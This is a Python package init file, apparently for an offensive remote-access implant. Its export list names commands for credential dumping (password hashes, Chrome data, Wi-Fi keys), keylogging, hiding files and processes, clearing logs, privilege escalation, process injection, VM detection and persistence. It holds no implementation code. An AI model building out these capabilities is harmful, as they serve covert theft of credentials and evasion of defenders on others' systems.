#!/usr/bin/env python3
"""
Elite Commands Package
Individual command implementations using advanced techniques
"""

__version__ = "2.0.0"

# All implemented elite commands
__all__ = [
    # Tier 1 - Core Commands
    'elite_ls', 'elite_download', 'elite_upload', 'elite_shell', 'elite_ps', 'elite_kill',
    
    # Filesystem Commands  
    'elite_cd', 'elite_pwd', 'elite_cat', 'elite_rm', 'elite_mkdir', 'elite_cp', 'elite_mv', 'elite_rmdir',
    
    # System Information Commands
    'elite_systeminfo', 'elite_whoami', 'elite_hostname', 'elite_network', 'elite_processes', 
    'elite_privileges', 'elite_username', 'elite_installedsoftware',
    
    # Tier 2 - Credential & Data Commands
    'elite_hashdump', 'elite_chromedump', 'elite_wifikeys', 'elite_screenshot', 'elite_keylogger',
    
    # Advanced Stealth Commands
    'elite_hidefile', 'elite_hideprocess', 'elite_clearlogs', 'elite_firewall', 'elite_escalate',
    
    # Advanced Features
    'elite_inject', 'elite_migrate', 'elite_vmscan', 'elite_port_forward', 'elite_persistence'
]